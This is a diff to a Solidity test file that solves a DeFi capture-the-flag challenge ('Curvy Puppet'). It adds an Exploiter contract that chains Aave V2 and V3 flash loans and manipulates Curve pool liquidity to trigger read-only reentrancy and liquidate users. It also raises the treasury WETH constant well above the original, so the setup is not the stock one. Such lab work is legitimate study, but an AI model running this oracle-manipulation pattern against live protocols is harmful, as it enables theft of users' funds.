@@ -28,7 +28,7 @@ contract CurvyPuppetChallenge is Test {
     IERC20 constant stETH = IERC20(0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84);
     WETH constant weth = WETH(payable(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2));
 
-    uint256 constant TREASURY_WETH_BALANCE = 200e18;
+    uint256 constant TREASURY_WETH_BALANCE = 2e24; // original 18
     uint256 constant TREASURY_LP_BALANCE = 65e17;
     uint256 constant LENDER_INITIAL_LP_BALANCE = 1000e18;
     uint256 constant USER_INITIAL_COLLATERAL_BALANCE = 2500e18;
@@ -158,8 +158,13 @@ contract CurvyPuppetChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_curvyPuppet() public checkSolvedByPlayer {
-        
-    }
+        address v2Pool = 0x7d2768dE32b0b80b7a3454c06BdAc94A69DDc7A9;
+        address v3Pool = 0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2; 
+        Exploiter exploiter = new Exploiter(v2Pool, v3Pool, IERC20(curvePool.lp_token()), curvePool, lending, weth, stETH, [alice, bob, charlie], address(permit2), address(dvt), treasury);
+        IERC20(curvePool.lp_token()).transferFrom(treasury, address(exploiter), TREASURY_LP_BALANCE-1);
+        weth.transferFrom(treasury, address(exploiter), TREASURY_WETH_BALANCE-1);
+        exploiter.exploit();
+    }   
 
     /**
      * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
@@ -183,4 +188,169 @@ contract CurvyPuppetChallenge is Test {
         assertEq(weth.balanceOf(player), 0, "Player still has WETH");
         assertEq(IERC20(curvePool.lp_token()).balanceOf(player), 0, "Player still has LP tokens");
     }
+}
+
+
+struct V2ReserveData {
+    ReserveConfigurationMap configuration;
+    uint128 liquidityIndex;
+    uint128 variableBorrowIndex;
+    uint128 currentLiquidityRate;
+    uint128 currentVariableBorrowRate;
+    uint128 currentStableBorrowRate;
+    uint40 lastUpdateTimestamp;
+    address aTokenAddress;
+    address stableDebtTokenAddress;
+    address variableDebtTokenAddress;
+    address interestRateStrategyAddress;
+    uint8 id;
+  }
+
+struct ReserveConfigurationMap {
+    uint256 data;
+}
+
+struct V3ReserveData {
+    ReserveConfigurationMap configuration;
+    uint128 liquidityIndex;
+    uint128 currentLiquidityRate;
+    uint128 variableBorrowIndex;
+    uint128 currentVariableBorrowRate;
+    uint128 currentStableBorrowRate;
+    uint40 lastUpdateTimestamp;
+    uint16 id;
+    address aTokenAddress;
+    address stableDebtTokenAddress;
+    address variableDebtTokenAddress;
+    address interestRateStrategyAddress;
+    uint128 accruedToTreasury;
+    uint128 unbacked;
+    uint128 isolationModeTotalDebt;
+}
+
+interface V2Pool {
+    function flashLoan(
+    address receiverAddress,
+    address[] calldata assets,
+    uint256[] calldata amounts,
+    uint256[] calldata modes,
+    address onBehalfOf,
+    bytes calldata params,
+    uint16 referralCode
+  ) external;
+
+  function getReserveData(address asset) external view returns (V2ReserveData memory);
+}
+
+interface V3Pool {
+    function getReserveData(address asset) external view returns (V3ReserveData memory);
+
+    function flashLoanSimple(
+    address receiverAddress,
+    address asset,
+    uint256 amount,
+    bytes calldata params,
+    uint16 referralCode
+  ) external;
+}
+
+contract Exploiter {
+
+    IERC20 lp_token;
+    IStableSwap curvePool;
+    CurvyPuppetLending lending;
+    V2Pool v2Pool;
+    V3Pool v3Pool;
+    WETH weth;
+    uint256 constant TREASURY_WETH_BALANCE = 200e18;
+    IERC20 stETH;
+    uint256 v2WETHTotal;
+    uint256 v3WETHTotal;
+    address[3] users;
+    address permit2;
+    address dvt;
+    address treasury;
+    bool attacked;
+
+    constructor(address _v2Pool, address _v3Pool, IERC20 _lp_token, IStableSwap _curvePool, CurvyPuppetLending _lending, WETH _weth, IERC20 _stETH, address[3] memory _users, address _permit2, address _dvt, address _treasury) payable {
+        lp_token = _lp_token;
+        curvePool = _curvePool;
+        lending = _lending;
+        v2Pool = V2Pool(_v2Pool);
+        v3Pool = V3Pool(_v3Pool);
+        weth = _weth;
+        stETH = _stETH;
+        permit2 = _permit2;
+        dvt = _dvt;
+        treasury = _treasury;
+        users = _users;
+
+        V2ReserveData memory data2 = v2Pool.getReserveData(address(weth));
+        V3ReserveData memory data3 = v3Pool.getReserveData(address(weth));
+        
+        v2WETHTotal = weth.balanceOf(data2.aTokenAddress);
+        v3WETHTotal = weth.balanceOf(data3.aTokenAddress);
+
+
+        IERC20(lp_token).approve(permit2, type(uint256).max);
+        IPermit2(permit2).approve({token:address(lp_token), 
+                                   spender:address(lending),
+                                   amount:3e18,
+                                   expiration:uint48(block.timestamp)});
+    }
+
+    function exploit() external {
+        v3Pool.flashLoanSimple(address(this), address(weth), v3WETHTotal, "", 0);
+    }
+
+
+    function executeOperation(address[] calldata, uint256[] calldata amounts, uint256[] calldata premiums, address, bytes calldata) external returns (bool) {
+        
+        
+        require(amounts.length == 1, "asset length not 1");
+        require(premiums.length == 1, "asset length not 1");
+        uint256 borrowedAmount = v2WETHTotal + v3WETHTotal;
+        weth.withdraw(borrowedAmount);
+
+        uint256 lpAdded = curvePool.add_liquidity{value:borrowedAmount}([borrowedAmount, 0], 0);
+        curvePool.remove_liquidity_imbalance([uint256(1e20), uint256(3554e19)], lpAdded);
+        curvePool.remove_liquidity_one_coin(lp_token.balanceOf(address(this)) - 3e18, 0, 0);
+
+        weth.deposit{value:address(this).balance}();
+        weth.approve(msg.sender, amounts[0] + premiums[0]);
+
+        return true;
+    }
+
+
+    function executeOperation(address asset, uint256 amount, uint256 premium, address, bytes calldata) external returns (bool) {
+        address[] memory assets = new address[](1);
+        uint256[] memory amounts = new uint256[](1);
+        uint256[] memory modes = new uint256[](1);
+        assets[0] = asset;
+        amounts[0] = v2WETHTotal;
+        modes[0] = 0;
+
+        v2Pool.flashLoan(address(this), assets, amounts, modes, address(0), "", 0);
+
+        uint256 totalOwed = amount + premium;
+        weth.approve(msg.sender, totalOwed);
+
+        return true;
+    }
+
+    receive() external payable {
+        
+        if ((msg.sender != address(weth)) && (!attacked)) {
+            
+            for (uint256 i = 0; i < 3; i++) {
+                lending.liquidate(users[i]);
+            }
+            uint256 collateral = IERC20(dvt).balanceOf(address(this));
+            IERC20(dvt).transfer(treasury, collateral);
+            attacked = true;
+        }   
+        
+    }
+
 }
